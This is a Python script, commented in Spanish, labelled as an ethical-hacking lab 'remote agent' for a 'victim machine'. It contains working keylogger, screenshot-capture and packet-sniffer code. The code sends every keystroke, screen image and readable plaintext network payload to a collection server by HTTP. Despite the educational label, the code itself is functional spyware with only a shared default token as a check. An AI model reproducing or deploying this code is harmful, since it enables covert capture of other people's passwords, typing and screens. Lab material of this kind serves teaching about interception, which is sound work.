"""
Agente Remoto - CyberTool Hacking Ético
========================================
Script autónomo que se ejecuta en la MÁQUINA VÍCTIMA dentro del
ambiente controlado de laboratorio.

Captura paquetes de red (modo sniffer) o pulsaciones de teclado
(modo keylogger) y los envía al servidor CyberTool central vía HTTP.

USO:
    # Modo sniffer (requiere sudo/root):
    sudo python3 remote_agent.py --server http://192.168.1.100:5000 --mode sniffer --count 50 --token CIBER2026

    # Modo keylogger:
    python3 remote_agent.py --server http://192.168.1.100:5000 --mode keylogger --duration 20 --token CIBER2026

DEPENDENCIAS (instalar en la máquina víctima):
    pip install scapy keyboard requests
"""

import argparse
import json
import os
import sys
import threading
import time
from datetime import datetime
import base64
import io

import requests

# Captura de pantalla
try:
    import mss
    from PIL import Image
    _SCREENSHOT_OK = True
except ImportError:
    _SCREENSHOT_OK = False


# ─────────────────────────────────────────────────────────────────────────────
# Puertos conocidos para clasificación de seguridad (igual que sniffer.py)
# ─────────────────────────────────────────────────────────────────────────────
INSECURE_PORTS = {
    20: {'name': 'FTP-Data', 'risk': 'CRÍTICO', 'desc': 'Transferencia de archivos sin cifrar'},
    21: {'name': 'FTP', 'risk': 'CRÍTICO', 'desc': 'Credenciales y archivos en texto plano'},
    23: {'name': 'Telnet', 'risk': 'CRÍTICO', 'desc': 'Sesión remota completamente en texto plano'},
    25: {'name': 'SMTP', 'risk': 'ALTO', 'desc': 'Correos electrónicos sin cifrar'},
    53: {'name': 'DNS', 'risk': 'MEDIO', 'desc': 'Consultas DNS visibles'},
    80: {'name': 'HTTP', 'risk': 'ALTO', 'desc': 'Navegación web sin cifrar'},
    110: {'name': 'POP3', 'risk': 'CRÍTICO', 'desc': 'Correo: usuario y contraseña en texto plano'},
    143: {'name': 'IMAP', 'risk': 'CRÍTICO', 'desc': 'Correo: credenciales en texto plano'},
    161: {'name': 'SNMP', 'risk': 'ALTO', 'desc': 'Monitoreo de red sin cifrar'},
    3306: {'name': 'MySQL', 'risk': 'CRÍTICO', 'desc': 'Base de datos sin cifrar'},
    5432: {'name': 'PostgreSQL', 'risk': 'ALTO', 'desc': 'Base de datos sin cifrar'},
    6379: {'name': 'Redis', 'risk': 'CRÍTICO', 'desc': 'Base de datos sin autenticación'},
    8080: {'name': 'HTTP-Alt', 'risk': 'ALTO', 'desc': 'Servidor web alternativo sin cifrar'},
}

SECURE_PORTS = {
    22: {'name': 'SSH', 'desc': 'Conexión remota cifrada'},
    443: {'name': 'HTTPS', 'desc': 'Navegación web cifrada'},
    465: {'name': 'SMTPS', 'desc': 'Correo cifrado con SSL'},
    587: {'name': 'SMTP+TLS', 'desc': 'Correo con STARTTLS'},
    636: {'name': 'LDAPS', 'desc': 'Directorio cifrado'},
    853: {'name': 'DNS-TLS', 'desc': 'DNS cifrado'},
    993: {'name': 'IMAPS', 'desc': 'Correo IMAP cifrado'},
    995: {'name': 'POP3S', 'desc': 'Correo POP3 cifrado'},
    8443: {'name': 'HTTPS-Alt', 'desc': 'Web alternativo cifrado'},
    3389: {'name': 'RDP', 'desc': 'Escritorio remoto cifrado'},
}


# ─────────────────────────────────────────────────────────────────────────────
# Utilidades de red
# ─────────────────────────────────────────────────────────────────────────────
def get_local_ip():
    """Obtiene la IP local de esta máquina."""
    import socket
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('8.8.8.8', 80))
            return s.getsockname()[0]
    except Exception:
        return '127.0.0.1'


def _take_screenshot_b64():
    """Toma una captura de pantalla y la devuelve como Base64 JPEG. None si falla."""
    if not _SCREENSHOT_OK:
        return None
    try:
        with mss.mss() as sct:
            raw = sct.grab(sct.monitors[0])
            img = Image.frombytes('RGB', raw.size, raw.bgra, 'raw', 'BGRX')
            if img.width > 1280:
                ratio = 1280 / img.width
                img = img.resize((1280, int(img.height * ratio)), Image.LANCZOS)
            buf = io.BytesIO()
            img.save(buf, format='JPEG', quality=65)
            return base64.b64encode(buf.getvalue()).decode('utf-8')
    except Exception:
        return None


def post_to_server(server_url: str, endpoint: str, payload: dict, token: str):
    """Envía datos al servidor CyberTool central."""
    try:
        payload['agent_token'] = token
        resp = requests.post(
            f"{server_url.rstrip('/')}/{endpoint}",
            json=payload,
            timeout=10
        )
        return resp.json()
    except requests.exceptions.ConnectionError:
        print(f"  [!] No se pudo conectar al servidor: {server_url}")
        return None
    except Exception as e:
        print(f"  [!] Error al enviar datos: {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# MODO SNIFFER REMOTO
# ─────────────────────────────────────────────────────────────────────────────
def classify_security(src_port, dst_port):
    """Clasifica la seguridad de un paquete por sus puertos."""
    for port in [dst_port, src_port]:
        if port in INSECURE_PORTS:
            info = INSECURE_PORTS[port]
            return {
                'service': info['name'],
                'security': 'insecure',
                'security_label': '⚠️ NO SEGURO - Texto Plano',
                'risk': info['risk'],
                'security_desc': info['desc']
            }
    for port in [dst_port, src_port]:
        if port in SECURE_PORTS:
            info = SECURE_PORTS[port]
            return {
                'service': info['name'],
                'security': 'secure',
                'security_label': '🔒 SEGURO - Cifrado',
                'risk': 'NINGUNO',
                'security_desc': info['desc']
            }
    return {
        'service': f'Puerto {min(src_port, dst_port)}',
        'security': 'unknown',
        'security_label': 'No clasificado',
        'risk': 'DESCONOCIDO',
        'security_desc': 'Protocolo no identificado'
    }


def run_remote_sniffer(server_url: str, token: str, count: int,
                       filter_protocol: str, interface: str | None):
    """
    Captura paquetes en la máquina local y los envía al servidor central.
    Requiere permisos de root/administrador.
    """
    try:
        from scapy.all import sniff, IP, TCP, UDP, ICMP, Raw
    except ImportError:
        print("[ERROR] scapy no está instalado. Ejecuta: pip install scapy")
        sys.exit(1)

    agent_ip = get_local_ip()
    packets_buffer = []

    print(f"\n{'='*55}")
    print(f"  🕵️  Agente Remoto — Modo SNIFFER")
    print(f"{'='*55}")
    print(f"  IP de este agente : {agent_ip}")
    print(f"  Servidor destino  : {server_url}")
    print(f"  Paquetes a capturar: {count}")
    print(f"  Filtro            : {filter_protocol}")
    print(f"  Interfaz          : {interface or 'predeterminada'}")
    print(f"{'='*55}\n")

    # Registrar agente en el servidor
    reg = post_to_server(server_url, 'agent/register', {
        'agent_ip': agent_ip,
        'mode': 'sniffer',
        'count': count,
        'filter': filter_protocol
    }, token)

    if reg is None:
        print("[ERROR] No se pudo registrar el agente. Verifica la IP y el servidor.")
        sys.exit(1)

    if not reg.get('success'):
        print(f"[ERROR] Servidor rechazó la conexión: {reg.get('error', 'Token inválido')}")
        sys.exit(1)

    print(f"  ✅ Agente registrado. Iniciando captura...")

    def process_packet(packet):
        """Callback de scapy: procesa cada paquete capturado."""
        packet_info = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
            'size': len(packet),
            'agent_ip': agent_ip
        }

        if IP in packet:
            packet_info['src_ip'] = packet[IP].src
            packet_info['dst_ip'] = packet[IP].dst
            packet_info['protocol'] = 'Otro'

            if TCP in packet:
                packet_info['protocol'] = 'TCP'
                packet_info['src_port'] = packet[TCP].sport
                packet_info['dst_port'] = packet[TCP].dport
                packet_info['flags'] = str(packet[TCP].flags)
                security = classify_security(packet[TCP].sport, packet[TCP].dport)
                packet_info.update(security)

            elif UDP in packet:
                packet_info['protocol'] = 'UDP'
                packet_info['src_port'] = packet[UDP].sport
                packet_info['dst_port'] = packet[UDP].dport
                security = classify_security(packet[UDP].sport, packet[UDP].dport)
                packet_info.update(security)

            elif ICMP in packet:
                packet_info['protocol'] = 'ICMP'
                packet_info['src_port'] = '-'
                packet_info['dst_port'] = '-'
                packet_info['service'] = 'Ping/ICMP'
                packet_info['security'] = 'info'
                packet_info['security_label'] = 'Informativo'
                packet_info['risk'] = 'BAJO'
                packet_info['security_desc'] = 'Paquete de diagnóstico'
            else:
                packet_info['src_port'] = '-'
                packet_info['dst_port'] = '-'
                packet_info['service'] = 'Desconocido'
                packet_info['security'] = 'unknown'
                packet_info['security_label'] = 'Desconocido'
                packet_info['risk'] = '-'
                packet_info['security_desc'] = ''

            # Payload / datos
            packet_info['data'] = ''
            packet_info['data_readable'] = False
            if Raw in packet:
                try:
                    raw_text = packet[Raw].load.decode('utf-8', errors='replace')[:200]
                    ratio = sum(1 for c in raw_text if c.isprintable()) / max(len(raw_text), 1)
                    if ratio > 0.7:
                        packet_info['data'] = raw_text
                        packet_info['data_readable'] = True
                    else:
                        packet_info['data'] = f'[Cifrado - {len(packet[Raw].load)} bytes]'
                except Exception:
                    packet_info['data'] = '[Error al leer]'

            packets_buffer.append(packet_info)

            # Enviar en lotes de 10 para no saturar
            if len(packets_buffer) % 10 == 0:
                _flush_packets(server_url, token, packets_buffer, agent_ip)

            prot_str = packet_info.get('protocol', '?')
            sec_str = packet_info.get('security', '?')
            src = f"{packet_info.get('src_ip', '?')}:{packet_info.get('src_port', '?')}"
            print(f"  📦 [{prot_str:4}] {src:25} → {sec_str}")

    # Construir filtro BPF
    bpf = None
    if filter_protocol == 'tcp':
        bpf = 'tcp'
    elif filter_protocol == 'udp':
        bpf = 'udp'
    elif filter_protocol == 'icmp':
        bpf = 'icmp'

    kwargs = {'prn': process_packet, 'count': count, 'store': False, 'timeout': 60}
    if bpf:
        kwargs['filter'] = bpf
    if interface:
        kwargs['iface'] = interface

    try:
        sniff(**kwargs)
    except PermissionError:
        print("\n[ERROR] Permisos insuficientes. Ejecuta con sudo:\n"
              "  sudo python3 remote_agent.py ...")
        sys.exit(1)

    # Flush de paquetes restantes
    if packets_buffer:
        _flush_packets(server_url, token, packets_buffer, agent_ip, final=True)

    print(f"\n  ✅ Captura finalizada. {len(packets_buffer)} paquetes enviados al servidor.")


def _flush_packets(server_url, token, packets, agent_ip, final=False):
    """Envía un lote de paquetes al servidor."""
    post_to_server(server_url, 'agent/push-packets', {
        'agent_ip': agent_ip,
        'packets': packets[:],
        'final': final
    }, token)


# ─────────────────────────────────────────────────────────────────────────────
# MODO KEYLOGGER REMOTO
# ─────────────────────────────────────────────────────────────────────────────
def run_remote_keylogger(server_url: str, token: str, duration: int,
                         screenshot_interval: int = 5):
    """
    Registra teclas y toma capturas de pantalla periódicas en la máquina local
    y los envía al servidor central.
    """
    try:
        import keyboard
    except ImportError:
        print("[ERROR] 'keyboard' no está instalado. Ejecuta: pip install keyboard")
        sys.exit(1)

    agent_ip = get_local_ip()
    keys_buffer = []
    screenshots_buffer = []

    print(f"\n{'='*55}")
    print(f"  ⌨️  Agente Remoto — Modo KEYLOGGER")
    print(f"{'='*55}")
    print(f"  IP de este agente : {agent_ip}")
    print(f"  Servidor destino  : {server_url}")
    print(f"  Duración          : {duration} segundos")
    print(f"  Capturas          : cada {screenshot_interval}s {'(desactivado)' if screenshot_interval == 0 else ''}")
    print(f"  Captura pantalla  : {'✅ disponible' if _SCREENSHOT_OK else '❌ instala mss y Pillow'}")
    print(f"{'='*55}\n")

    # Registrar agente
    reg = post_to_server(server_url, 'agent/register', {
        'agent_ip': agent_ip,
        'mode': 'keylogger',
        'duration': duration
    }, token)

    if reg is None:
        print("[ERROR] No se pudo conectar al servidor.")
        sys.exit(1)

    if not reg.get('success'):
        print(f"[ERROR] Token inválido o servidor rechazó la conexión: {reg.get('error')}")
        sys.exit(1)

    print(f"  ✅ Agente registrado. Capturando durante {duration}s...")
    print(f"  ⌨️  Escribe en cualquier ventana...\n")

    SPECIAL_KEYS = {
        'space': 'espacio', 'enter': 'enter', 'tab': 'tabulación',
        'backspace': 'borrar', 'delete': 'suprimir', 'escape': 'escape',
        'shift': 'modificador', 'ctrl': 'modificador', 'alt': 'modificador',
        'caps lock': 'modificador', 'left shift': 'modificador',
        'right shift': 'modificador', 'left ctrl': 'modificador',
        'right ctrl': 'modificador', 'left alt': 'modificador',
        'right alt': 'modificador', 'left windows': 'modificador',
        'right windows': 'modificador',
        'up': 'navegación', 'down': 'navegación',
        'left': 'navegación', 'right': 'navegación',
        'home': 'navegación', 'end': 'navegación',
        'page up': 'navegación', 'page down': 'navegación',
    }

    def classify_key(name):
        if name in SPECIAL_KEYS:
            return SPECIAL_KEYS[name]
        if name.startswith('f') and name[1:].isdigit():
            return 'función'
        if len(name) == 1:
            if name.isalpha():
                return 'letra'
            elif name.isdigit():
                return 'número'
            else:
                return 'símbolo'
        return 'especial'

    def on_key(event):
        if event.event_type == 'down':
            key_info = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3],
                'key': event.name,
                'key_code': event.scan_code,
                'type': classify_key(event.name),
                'agent_ip': agent_ip
            }
            keys_buffer.append(key_info)
            print(f"  ⌨️  [{key_info['type']:12}] {event.name}")

            # Enviar en lotes de 15
            if len(keys_buffer) % 15 == 0:
                _flush_keys(server_url, token, keys_buffer[:], agent_ip)

    stop_event = threading.Event()
    keyboard.on_press(on_key)

    # ── Hilo de capturas de pantalla ───────────────────────────────────
    if screenshot_interval > 0 and _SCREENSHOT_OK:
        def screenshot_loop():
            idx = 0
            while not stop_event.is_set():
                stop_event.wait(screenshot_interval)
                if stop_event.is_set():
                    break
                img_b64 = _take_screenshot_b64()
                if img_b64:
                    idx += 1
                    scr = {
                        'index': idx,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'agent_ip': agent_ip,
                        'data': img_b64
                    }
                    screenshots_buffer.append(scr)
                    print(f"  📸 Captura #{idx} tomada ({len(img_b64)//1024} KB)")
                    # Enviar captura inmediatamente
                    _flush_keys(server_url, token, [], agent_ip,
                                screenshots=[scr])
        scr_thread = threading.Thread(target=screenshot_loop, daemon=True)
        scr_thread.start()
        print(f"  📸 Capturas de pantalla activadas (cada {screenshot_interval}s)")

    timer = threading.Timer(duration, stop_event.set)
    timer.start()
    stop_event.wait()
    timer.cancel()
    keyboard.unhook_all()

    # Flush final
    _flush_keys(server_url, token, keys_buffer, agent_ip, final=True)
    print(f"\n  ✅ Captura finalizada.")
    print(f"  ⌨️  {len(keys_buffer)} teclas enviadas al servidor.")
    print(f"  📸 {len(screenshots_buffer)} capturas de pantalla enviadas.")


def _flush_keys(server_url, token, keys, agent_ip, screenshots=None, final=False):
    """Envía un lote de teclas y opcionalmente capturas al servidor."""
    post_to_server(server_url, 'agent/push-keys', {
        'agent_ip': agent_ip,
        'keys': keys,
        'screenshots': screenshots or [],
        'final': final
    }, token)


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='Agente Remoto CyberTool — Hacking Ético (Uso Educativo)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 remote_agent.py --server http://192.168.1.100:5000 --mode sniffer --count 50 --token CIBER2026
  python3 remote_agent.py --server http://192.168.1.100:5000 --mode keylogger --duration 20 --token CIBER2026
        """
    )
    parser.add_argument('--server', required=True,
                        help='URL del servidor CyberTool (ej: http://192.168.1.100:5000)')
    parser.add_argument('--mode', required=True, choices=['sniffer', 'keylogger'],
                        help='Modo de captura: sniffer o keylogger')
    parser.add_argument('--token', default='CIBER2026',
                        help='Token de autenticación (debe coincidir con el servidor)')
    parser.add_argument('--count', type=int, default=50,
                        help='[Sniffer] Número máximo de paquetes a capturar (default: 50)')
    parser.add_argument('--filter', default='all',
                        choices=['all', 'tcp', 'udp', 'icmp'],
                        help='[Sniffer] Filtro de protocolo (default: all)')
    parser.add_argument('--interface', default=None,
                        help='[Sniffer] Interfaz de red (default: automática)')
    parser.add_argument('--duration', type=int, default=10,
                        help='[Keylogger] Duración en segundos (default: 10, máx: 60)')
    parser.add_argument('--screenshot-interval', type=int, default=5, dest='screenshot_interval',
                        help='[Keylogger] Cada cuántos segundos tomar captura de pantalla (0=desactivar, default: 5)')

    args = parser.parse_args()

    # Validaciones
    if args.duration > 60:
        args.duration = 60
    if args.count > 500:
        args.count = 500

    if args.mode == 'sniffer':
        run_remote_sniffer(
            server_url=args.server,
            token=args.token,
            count=args.count,
            filter_protocol=args.filter,
            interface=args.interface
        )
    elif args.mode == 'keylogger':
        run_remote_keylogger(
            server_url=args.server,
            token=args.token,
            duration=args.duration,
            screenshot_interval=args.screenshot_interval
        )


if __name__ == '__main__':
    main()
